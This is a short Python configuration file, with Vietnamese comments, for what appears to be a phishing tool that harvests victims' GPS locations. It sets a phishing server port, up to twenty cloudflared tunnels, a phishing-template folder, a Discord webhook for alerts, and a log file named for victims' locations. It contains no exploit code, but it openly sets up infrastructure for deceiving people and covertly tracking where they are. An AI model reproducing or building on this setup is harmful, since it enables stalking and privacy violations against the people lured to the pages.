import os

# Đường dẫn gốc
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Cổng
ADMIN_PORT = 4467
PHISHING_PORT = 0          # 0 = tự động chọn cổng trống

# Đường dẫn dữ liệu
DATA_DIR = os.path.join(BASE_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)

# Database
DATABASE_PATH = os.path.join(DATA_DIR, "gps_tunnel.db")

# Cloudflared
CLOUDFLARED_PATH = os.path.join(BASE_DIR, "downloads", "cloudflared")

# Log
VICTIMS_LOG = os.path.join(DATA_DIR, "victims_locations.log")

# Tunnel
MAX_TUNNELS = 20
TUNNEL_AUTO_STOP_MINUTES = 0  # 0 = vô hạn
DEFAULT_TUNNEL_MAX_RESTARTS = 3

# Webhook mặc định (có thể ghi đè trong DB)
DISCORD_WEBHOOK_URL = ""

# Template
TEMPLATES_DIR = os.path.join(BASE_DIR, "phishing_templates")
os.makedirs(TEMPLATES_DIR, exist_ok=True)

# SSE Event TTL (giây) để replay
EVENT_TTL = 3600

# Rate limit admin API (requests per minute)
ADMIN_RATE_LIMIT = 60
